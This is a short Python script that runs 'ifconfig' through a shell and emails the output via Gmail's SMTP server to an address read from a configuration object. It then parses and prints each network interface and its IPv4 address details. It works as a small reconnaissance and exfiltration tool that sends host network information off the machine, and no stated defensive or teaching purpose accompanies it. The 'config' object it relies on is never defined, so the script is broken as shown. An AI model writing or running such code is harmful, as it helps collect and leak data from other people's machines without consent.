#!/usr/bin/env python
import subprocess, smtplib, re


def send_mail(email, passwd, message):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, passwd)
    server.sendmail(email, email, message)
    server.quit()


command = 'ifconfig'

# subprocess.Popen(command, shell=True)

res = subprocess.check_output(command, shell=True).decode()
send_mail(config["email"]["ADDRESS"], passwd=config["email"]["PASS"], message=res)
print(len(res), res)


nnetworks = res.split('\n\n')
networks = {}
for n in nnetworks:
    if n == '':
        continue
    n = n.split(': ')

    print(f'[+] Network interface: {n[0]}')
    networks[n[0]] = None
    deets = n[1].split('\n')
    print(f'[+] Deets: {deets}')

    for deet in deets:
        if 'inet' in deet and 'inet6' not in deet:
            addy = deet.split()   # ('inet')[1]
            addy = dict(zip(addy[::2], addy[1::2]))
            networks[n[0]] = addy


print(networks)
